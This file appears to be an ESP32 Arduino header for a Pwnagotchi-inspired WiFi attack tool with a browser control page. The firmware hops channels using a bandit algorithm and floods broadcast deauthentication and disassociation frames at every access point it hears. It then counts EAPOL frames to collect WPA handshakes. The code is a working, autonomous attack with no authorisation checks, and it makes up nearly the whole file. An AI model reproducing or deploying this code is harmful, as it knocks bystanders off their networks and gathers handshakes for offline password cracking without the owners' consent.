#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <math.h>
#include "module.h"
#include "safety.h"
#include "frames.h"

// ── Pwnagotchi-inspired autonomous WiFi handshake hunter ──────────────────────
//
// Uses UCB (Upper Confidence Bound) multi-armed bandit algorithm to pick the
// channel most likely to yield EAPOL frames. Sends broadcast deauths to force
// client reconnects, then listens for EAPOL exchanges.
//
// Visit /pwnface in browser for the live face display.

// ── Mood ──────────────────────────────────────────────────────────────────────
enum PwMood { PW_SLEEP=0, PW_BORED, PW_SCAN, PW_EXCITED, PW_HAPPY, PW_PWNING };
static const char* const PW_MOOD_K[] = {"sleep","bored","scan","excited","happy","pwning"};

// ── Per-channel UCB stats ─────────────────────────────────────────────────────
struct PwChan {
  uint8_t  ch;
  uint16_t visits;
  uint16_t eapol;    // EAPOL frames seen on this channel (after deauth)
  uint16_t deauths;
};

// ── AP record ─────────────────────────────────────────────────────────────────
#define PW_MAX_APS  32
struct PwAP {
  uint8_t bssid[6];
  uint8_t ch;
  int8_t  rssi;
};

// ── Log ───────────────────────────────────────────────────────────────────────
#define PW_LOG_SZ  12
#define PW_LOG_CL  64
static char   pw_log_buf[PW_LOG_SZ][PW_LOG_CL];
static int    pw_log_head  = 0;
static int    pw_log_count = 0;

static void pw_log_add(const char* fmt, ...) {
  char tmp[PW_LOG_CL];
  va_list ap; va_start(ap, fmt); vsnprintf(tmp, PW_LOG_CL, fmt, ap); va_end(ap);
  memcpy(pw_log_buf[pw_log_head], tmp, PW_LOG_CL);
  pw_log_head = (pw_log_head + 1) % PW_LOG_SZ;
  if (pw_log_count < PW_LOG_SZ) pw_log_count++;
}

// ── State ─────────────────────────────────────────────────────────────────────
static PwChan pw_chans[13];
static PwAP   pw_aps[PW_MAX_APS];
static volatile int    pw_ap_count    = 0;
static volatile uint32_t pw_hs        = 0;  // approx handshakes (EAPOL/4 rounded up)
static volatile uint32_t pw_total_aps = 0;
static volatile uint32_t pw_epoch     = 0;
static volatile uint8_t  pw_cur_ch    = 1;
static PwMood pw_mood    = PW_SLEEP;
static bool   pw_running = false;
static TaskHandle_t pw_task = nullptr;
static volatile uint32_t pw_total_visits = 0;

// Sniff counters reset each phase
static volatile uint16_t pw_snap_beacon = 0;
static volatile uint16_t pw_snap_eapol  = 0;

// ── UCB channel selection ─────────────────────────────────────────────────────
// score = eapol/visits + sqrt(2 * ln(total_visits) / visits)
// Unvisited channels return FLT_MAX (explore first).
static int pw_next_ch_idx() {
  for (int i = 0; i < 13; i++)
    if (pw_chans[i].visits == 0) return i;
  float best = -1.0f; int bi = 0;
  float lnT = logf((float)(pw_total_visits > 1 ? pw_total_visits : 2));
  for (int i = 0; i < 13; i++) {
    float exploit = (float)pw_chans[i].eapol / pw_chans[i].visits;
    float explore  = sqrtf(2.0f * lnT / pw_chans[i].visits);
    float s = exploit + explore;
    if (s > best) { best = s; bi = i; }
  }
  return bi;
}

// ── AP tracking ───────────────────────────────────────────────────────────────
static void pw_ap_add(const uint8_t* bssid, uint8_t ch, int8_t rssi) {
  for (int i = 0; i < pw_ap_count; i++) {
    if (memcmp(pw_aps[i].bssid, bssid, 6) == 0) {
      pw_aps[i].rssi = rssi; pw_aps[i].ch = ch; return;
    }
  }
  if (pw_ap_count >= PW_MAX_APS) return;
  int idx = pw_ap_count; // read once to avoid race with volatile
  memcpy(pw_aps[idx].bssid, bssid, 6);
  pw_aps[idx].ch   = ch;
  pw_aps[idx].rssi = rssi;
  pw_ap_count = idx + 1;
  pw_total_aps++;
}

// ── Promiscuous callback ───────────────────────────────────────────────────────
static void pw_rx(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* f = p->payload;
  uint32_t len = p->rx_ctrl.sig_len;
  if (type == WIFI_PKT_MGMT && len >= 24) {
    if (f[0] == 0x80 || f[0] == 0x50) { // beacon or probe response
      pw_snap_beacon++;
      pw_ap_add(f + 16, p->rx_ctrl.channel, p->rx_ctrl.rssi);
    }
  } else if (type == WIFI_PKT_DATA && len >= 32) {
    bool qos = (f[0] & 0x80) != 0; // QoS data: bit 7 of frame control byte 0
    int llc = 24 + (qos ? 2 : 0);
    if ((int)len >= llc + 8) {
      // LLC/SNAP header: AA AA 03 [OUI 3B] [EtherType 2B]
      if (f[llc]==0xAA && f[llc+1]==0xAA && f[llc+2]==0x03 &&
          f[llc+6]==0x88 && f[llc+7]==0x8E) {
        pw_snap_eapol++;
      }
    }
  }
}

// ── Autonomous task ───────────────────────────────────────────────────────────
static void pw_run_task(void*) {
  static const uint8_t BC[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t fbuf[64];

  pw_log_add("Pwngotchi awakens. Hunting...");

  while (pw_running) {
    int ci = pw_next_ch_idx();
    uint8_t ch = pw_chans[ci].ch;
    pw_cur_ch = ch;
    pw_mood   = PW_SCAN;

    // Hop to channel
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    // Phase 1 — listen 500ms, discover APs via beacons
    pw_snap_beacon = 0;
    pw_snap_eapol  = 0;
    vTaskDelay(pdMS_TO_TICKS(500));
    uint16_t beacons = pw_snap_beacon;

    if (beacons == 0) {
      pw_mood = PW_BORED;
    } else {
      // Phase 2 — 5 deauth bursts across all APs on this channel
      pw_mood = PW_EXCITED;
      int snap = pw_ap_count;
      for (int burst = 0; burst < 5; burst++) {
        for (int ai = 0; ai < snap; ai++) {
          if (pw_aps[ai].ch != ch) continue;
          size_t n = f_deauth(fbuf, BC, pw_aps[ai].bssid, 7);
          esp_wifi_80211_tx(WIFI_IF_AP, fbuf, n, false);
          n = f_disassoc(fbuf, BC, pw_aps[ai].bssid, 8);
          esp_wifi_80211_tx(WIFI_IF_AP, fbuf, n, false);
          pw_chans[ci].deauths += 2;
        }
        vTaskDelay(pdMS_TO_TICKS(60));
      }

      // Phase 3 — listen 2000ms for EAPOL
      pw_snap_eapol = 0;
      vTaskDelay(pdMS_TO_TICKS(2000));
      uint16_t eapol = pw_snap_eapol;
      pw_chans[ci].eapol += eapol;

      if (eapol > 0) {
        uint32_t sessions = eapol / 4 + (eapol % 4 ? 1 : 0);
        pw_hs += sessions;
        pw_mood = (pw_hs > 0 && pw_hs % 5 == 0) ? PW_PWNING : PW_HAPPY;
        pw_log_add("[%u] ch%u: %u EAPOL → ~%u hs", (unsigned)pw_epoch, ch, eapol, (unsigned)sessions);
      } else {
        pw_mood = PW_BORED;
        if (beacons > 0) {
          pw_log_add("[%u] ch%u: %u beacons, 0 EAPOL", (unsigned)pw_epoch, ch, beacons);
        }
      }
    }

    pw_chans[ci].visits++;
    pw_total_visits++;

    // Epoch: every 13 channel visits = one full sweep
    if (pw_total_visits > 0 && pw_total_visits % 13 == 0) {
      pw_epoch++;
      pw_log_add("[epoch %u] hs=%u aps=%u", (unsigned)pw_epoch, (unsigned)pw_hs, (unsigned)pw_total_aps);
    }

    vTaskDelay(pdMS_TO_TICKS(10));
  }

  pw_task = nullptr;
  vTaskDelete(nullptr);
}

// ── Face HTML page ────────────────────────────────────────────────────────────
static const char PW_HTML[] PROGMEM = R"html(<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Pwngotchi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--red:#e8233a;--dim:#687080;--bg:#0b0d12;--surf:#1a1c22;--eink:#cdd2c8;--einktxt:#0a0b08}
body{background:var(--bg);color:#dde3ec;font-family:'Courier New',monospace;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:1.2rem 1rem 3rem;overflow-x:hidden}
h2{font-size:.72rem;letter-spacing:.4em;color:var(--dim);margin-bottom:1rem;text-transform:uppercase}
/* ── 3D Scene ── */
.scene{perspective:1600px;width:100%;display:flex;justify-content:center;padding:1rem 2rem 3.5rem;position:relative}
.device{position:relative;display:inline-block;transform:perspective(1400px) rotateX(12deg) rotateY(-20deg);animation:hvr 8s ease-in-out infinite;filter:drop-shadow(0 36px 52px rgba(0,0,0,.85)) drop-shadow(0 8px 12px rgba(0,0,0,.5))}
@keyframes hvr{0%,100%{transform:perspective(1400px) rotateX(12deg) rotateY(-20deg) translateY(0)}50%{transform:perspective(1400px) rotateX(14deg) rotateY(-18deg) translateY(-10px)}}
/* Device depth sides */
.d-sl{position:absolute;left:-26px;top:12px;width:26px;bottom:12px;background:linear-gradient(to right,#050609,#0f1015);border-radius:10px 0 0 10px}
.d-sb{position:absolute;left:12px;right:12px;bottom:-20px;height:20px;background:linear-gradient(to bottom,#0f1015,#050609);border-radius:0 0 10px 10px}
/* Physical side buttons */
.d-btns{position:absolute;left:-26px;top:0;bottom:0;width:26px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;z-index:5}
.d-btn{width:14px;height:14px;border-radius:50%;background:#1e2130;border:1px solid #2a2d3e;cursor:pointer;transition:all .12s;display:flex;align-items:center;justify-content:center;font-size:6px;color:var(--dim);user-select:none}
.d-btn:hover{background:#2a2d3e;transform:scale(1.1)}
.d-btn:active{background:var(--red);box-shadow:0 0 8px var(--red)}
.d-btn.on{background:var(--red);box-shadow:0 0 6px var(--red)}
/* Front face */
.d-front{position:relative;width:400px;background:var(--surf);border-radius:10px;border:1px solid #262930;box-shadow:inset 0 1px 0 rgba(255,255,255,.04),-26px 14px 0 -2px #09090e}
/* GPIO header pins (decorative) */
.d-gpio{position:absolute;top:5px;left:50%;transform:translateX(-50%);display:flex;gap:2px}
.d-pin{width:3px;height:7px;background:#b8882a;border-radius:1px 1px 0 0}
/* Status LEDs */
.d-leds{position:absolute;top:8px;right:12px;display:flex;gap:5px}
.led{width:7px;height:7px;border-radius:50%;background:#1e2130;transition:all .3s}
.led.r{background:var(--red);box-shadow:0 0 8px var(--red);animation:lp 1s infinite}
.led.g{background:#27ae60;box-shadow:0 0 8px #27ae60;animation:lp 2.5s infinite}
@keyframes lp{0%,100%{opacity:1}50%{opacity:.35}}
/* Screen bezel */
.d-bezel{margin:12px 48px 10px 10px;background:#0d0e12;border-radius:4px;padding:2px;border:1px solid #131519}
/* E-ink display */
.eink{background:var(--eink);color:var(--einktxt);font-family:'Courier New',monospace;font-size:11px;line-height:1.4;padding:6px 8px;display:flex;flex-direction:column;gap:4px;min-height:140px;position:relative;overflow:hidden}
.eink::after{content:'';position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.025) 3px,rgba(0,0,0,.025) 4px);pointer-events:none}
.e-row{display:flex;justify-content:space-between;font-weight:700;letter-spacing:.02em;font-size:10.5px}
.e-fw{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:.5rem 0}
.e-face{font-size:28px;line-height:1.3;letter-spacing:.08em;transition:transform .2s;user-select:none}
.e-face.anim{transform:scale(1.12)}
.e-moodtxt{font-size:9px;letter-spacing:.2em;margin-top:3px;color:#1e2a18;text-transform:uppercase}
/* Branding + USB nub */
.d-brand{position:absolute;bottom:7px;right:12px;font-size:9px;color:#22262e;letter-spacing:.2em}
.d-brand span{color:#3a1a1f}
.d-usb{position:absolute;right:-5px;top:50%;transform:translateY(-50%);width:5px;height:28px;background:#0a0b0e;border-radius:0 3px 3px 0}
/* ── Stats ── */
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:.5rem;width:100%;max-width:470px;margin-top:.7rem}
.scard{background:#14161c;border:1px solid #1e2130;border-radius:6px;padding:.6rem;text-align:center}
.sv{font-size:1.4rem;font-weight:700;color:#dde3ec}
.sl{font-size:.62rem;color:var(--dim);letter-spacing:.1em;margin-top:.2rem;text-transform:uppercase}
.scard.act .sv{color:var(--red)}
/* ── Controls ── */
.ctrl{display:flex;gap:10px;margin:.8rem 0;justify-content:center}
.cbtn{font-family:'Courier New',monospace;padding:.55rem 1.6rem;border-radius:4px;cursor:pointer;font-size:.8rem;letter-spacing:.15em;border:1px solid;transition:all .2s}
.cbtn-s{background:transparent;border-color:var(--red);color:var(--red)}
.cbtn-s:hover{background:var(--red);color:#0b0d12}
.cbtn-s.on{background:#1a0608;border-color:#661219;color:#aa2233}
.cbtn-h{background:transparent;border-color:#2a2d3e;color:var(--dim)}
.cbtn-h:hover{border-color:#687080;color:#dde3ec}
/* ── Channel bar ── */
.ch-wrap{width:100%;max-width:470px;margin-top:.7rem}
.ch-title{font-size:.62rem;color:var(--dim);letter-spacing:.2em;margin-bottom:.4rem}
.ch-bar{display:flex;gap:3px;align-items:flex-end;height:52px;padding-bottom:16px}
.chb{width:14px;background:#1e2130;border-radius:3px 3px 0 0;position:relative;display:flex;align-items:flex-end}
.chbf{width:100%;background:var(--red);border-radius:2px 2px 0 0;min-height:3px;transition:height .5s}
.chl{position:absolute;bottom:-14px;left:0;right:0;font-size:8px;color:#3a4555;text-align:center}
/* ── Activity log ── */
.log-wrap{width:100%;max-width:470px;margin-top:.7rem;border-top:1px solid #1e2130}
.log-title{font-size:.62rem;color:var(--dim);letter-spacing:.2em;padding:.5rem 0 .3rem}
.le{font-size:.7rem;color:#3a4555;padding:.18rem 0;border-bottom:1px solid #111520;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.le:first-child{color:#687080}
</style>
</head><body>
<h2>&#x2310;&#x25A0;_&#x25A0; Pwnagotchi</h2>
<!-- 3D Device scene -->
<div class="scene">
<div class="device" id="dev">
  <div class="d-sl"></div>
  <div class="d-sb"></div>
  <div class="d-btns">
    <div class="d-btn" id="dbp" onclick="togglePwn()" title="Power">&#x23FB;</div>
    <div class="d-btn" title="Info">&#x25B2;</div>
    <div class="d-btn" title="Log">&#x25BC;</div>
  </div>
  <div class="d-front">
    <div class="d-gpio"><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div></div>
    <div class="d-leds"><div class="led" id="l0"></div><div class="led" id="l1"></div></div>
    <div class="d-bezel">
      <div class="eink">
        <div class="e-row"><span id="e-ch">ch:1</span><span id="e-aps">aps:0</span><span id="e-time">00:00:00</span></div>
        <div class="e-fw">
          <div class="e-face" id="eface">&#x28;&#xA8;_&#xA8; &#x29;</div>
          <div class="e-moodtxt" id="emood">sleeping</div>
        </div>
        <div class="e-row"><span id="e-hs">hs:0</span><span id="e-ep">ep:0</span><span id="e-up">00:00:00</span></div>
      </div>
    </div>
    <div class="d-brand">PHANTOM<span>32</span></div>
    <div class="d-usb"></div>
  </div>
</div>
</div>
<!-- Stats grid -->
<div class="stats">
  <div class="scard"><div class="sv" id="s-hs">0</div><div class="sl">Handshakes</div></div>
  <div class="scard"><div class="sv" id="s-aps">0</div><div class="sl">APs Seen</div></div>
  <div class="scard"><div class="sv" id="s-ep">0</div><div class="sl">Epoch</div></div>
  <div class="scard act"><div class="sv" id="s-st">OFFLINE</div><div class="sl">State</div></div>
</div>
<!-- Controls -->
<div class="ctrl">
  <button class="cbtn cbtn-s" id="cbs" onclick="togglePwn()">&#x25B6; START</button>
  <button class="cbtn cbtn-h" onclick="location.href='/'">&#x2190; Hub</button>
</div>
<!-- Channel bar -->
<div class="ch-wrap">
  <div class="ch-title">CHANNEL ACTIVITY</div>
  <div class="ch-bar" id="ch-bar"></div>
</div>
<!-- Activity log -->
<div class="log-wrap">
  <div class="log-title">ACTIVITY LOG</div>
  <div id="log"></div>
</div>
<script>
const F={sleep:'(- _ -)',bored:'(-__-)',scan:'(. ._)',excited:'(^o^)',happy:'(:D)',pwning:'(>_<)'};
const M={sleep:'sleeping',bored:'nothing here...',scan:'scanning...',excited:'eapol detected!',happy:'handshake!',pwning:'pwned.'};
let g_run=false,g_t0=null,g_lm='';
const $=id=>document.getElementById(id);
function fmt(ms){if(!ms)return'00:00:00';const s=Math.floor((Date.now()-ms)/1000);return[Math.floor(s/3600),Math.floor((s%3600)/60),s%60].map(n=>n.toString().padStart(2,'0')).join(':');}
async function tick(){
  try{
    const d=await(await fetch('/api/pwnface/status')).json();
    g_run=!!d.running;
    $('e-ch').textContent='ch:'+d.chan;
    $('e-aps').textContent='aps:'+d.aps;
    $('e-time').textContent=new Date().toLocaleTimeString('en',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'});
    const fe=$('eface');
    if(d.mood!==g_lm){g_lm=d.mood;fe.classList.add('anim');setTimeout(()=>{fe.textContent=F[d.mood]||F.sleep;fe.classList.remove('anim');},150);}
    $('emood').textContent=M[d.mood]||d.mood;
    $('e-hs').textContent='hs:'+d.hs;
    $('e-ep').textContent='ep:'+d.epoch;
    $('e-up').textContent=g_t0?fmt(g_t0):'00:00:00';
    $('l0').className='led'+(d.running?' r':'');
    $('l1').className='led'+(d.running&&(d.mood==='happy'||d.mood==='pwning')?' g':'');
    $('dbp').className='d-btn'+(d.running?' on':'');
    const cb=$('cbs');cb.textContent=d.running?'■ STOP':'▶ START';cb.className='cbtn cbtn-s'+(d.running?' on':'');
    $('s-hs').textContent=d.hs;$('s-aps').textContent=d.aps;$('s-ep').textContent=d.epoch;
    $('s-st').textContent=d.running?(M[d.mood]||'running').toUpperCase():'OFFLINE';
    if(d.chans&&d.chans.length){
      const mx=Math.max(1,...d.chans.map(c=>c.e));
      $('ch-bar').innerHTML=d.chans.map(c=>{const h=Math.round(c.e/mx*44)||4;const a=c.c==d.chan;return'<div class="chb" title="ch'+c.c+': '+c.e+' EAPOL"><div class="chbf" style="height:'+h+'px;background:'+(a?'#ff6680':'#e8233a')+'"></div><span class="chl">'+c.c+'</span></div>';}).join('');
    }
    if(d.log&&d.log.length)$('log').innerHTML=d.log.map(l=>'<div class="le">'+l+'</div>').join('');
  }catch(e){}
  setTimeout(tick,2000);
}
async function startPwn(){await fetch('/api/pwnface/start',{method:'POST'}).catch(()=>{});g_t0=Date.now();tick();}
async function stopPwn(){await fetch('/api/pwnface/stop',{method:'POST'}).catch(()=>{});g_t0=null;tick();}
function togglePwn(){g_run?stopPwn():startPwn();}
$('ch-bar').innerHTML=Array.from({length:13},function(_,i){return'<div class="chb"><div class="chbf" style="height:4px"></div><span class="chl">'+(i+1)+'</span></div>';}).join('');
tick();
</script>
</body></html>)html";

// ── Start / stop ──────────────────────────────────────────────────────────────
void aegisSniff(void*, wifi_promiscuous_pkt_type_t);
static bool pw_start(const String&) {
  if (pw_running) return false;
  pw_hs = 0; pw_total_aps = 0; pw_epoch = 0; pw_ap_count = 0;
  pw_log_head = 0; pw_log_count = 0; pw_total_visits = 0; pw_mood = PW_SLEEP;
  for (int i = 0; i < 13; i++) pw_chans[i] = {(uint8_t)(i+1), 0, 0, 0};
  memset(pw_log_buf, 0, sizeof(pw_log_buf));
  memset(pw_aps, 0, sizeof(pw_aps));
  wifi_promiscuous_filter_t f = {};
  f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&f);
  esp_wifi_set_promiscuous_rx_cb(pw_rx);
  esp_wifi_set_promiscuous(true);
  pw_running = true;
  xTaskCreate(pw_run_task, "pwnface", 6144, nullptr, 4, &pw_task);
  return true;
}
static void pw_stop() {
  pw_running = false;
  if (pw_task) { vTaskDelay(pdMS_TO_TICKS(100)); pw_task = nullptr; }
  pw_mood = PW_SLEEP;
  pw_log_add("Sleeping. hs=%u aps=%u ep=%u", (unsigned)pw_hs, (unsigned)pw_total_aps, (unsigned)pw_epoch);
  esp_wifi_set_promiscuous_rx_cb(aegisSniff);
  wifi_promiscuous_filter_t f = {};
  f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&f);
  esp_wifi_set_promiscuous(true);
}

// ── Routes ────────────────────────────────────────────────────────────────────
static void pw_routes() {
  extern WebServer server;

  server.on("/pwnface", HTTP_GET, [](){
    server.sendHeader("Cache-Control","no-cache");
    server.send_P(200, "text/html", PW_HTML);
  });

  server.on("/api/pwnface/start", HTTP_POST, [](){
    String q; for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
    bool ok = tool_start("pwnface", q);
    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
  });

  server.on("/api/pwnface/stop", HTTP_POST, [](){
    tool_stop("pwnface");
    server.send(200,"application/json","{\"ok\":1}");
  });

  server.on("/api/pwnface/status", HTTP_GET, [](){
    String j = "{";
    j += "\"running\":" + String(pw_running?1:0);
    j += ",\"mood\":\""  + String(PW_MOOD_K[pw_mood]) + "\"";
    j += ",\"hs\":"      + String(pw_hs);
    j += ",\"aps\":"     + String(pw_total_aps);
    j += ",\"epoch\":"   + String(pw_epoch);
    j += ",\"chan\":"     + String(pw_cur_ch);
    j += ",\"sent\":"    + String(pw_hs);
    j += ",\"msg\":\"epoch " + String(pw_epoch) + " | " + String(pw_hs) + " hs | " + String(pw_total_aps) + " APs\"";
    // Per-channel array
    j += ",\"chans\":[";
    for (int i = 0; i < 13; i++) {
      if (i) j += ",";
      j += "{\"c\":" + String(pw_chans[i].ch ? pw_chans[i].ch : (uint8_t)(i+1));
      j += ",\"e\":" + String(pw_chans[i].eapol) + "}";
    }
    j += "]";
    // Activity log (most recent first)
    j += ",\"log\":[";
    bool first = true;
    for (int i = 0; i < pw_log_count; i++) {
      int idx = ((pw_log_head - 1 - i) + PW_LOG_SZ) % PW_LOG_SZ;
      if (!pw_log_buf[idx][0]) continue;
      if (!first) j += ",";
      j += "\""; j += pw_log_buf[idx]; j += "\"";
      first = false;
    }
    j += "]}";
    server.send(200, "application/json", j);
  });
}
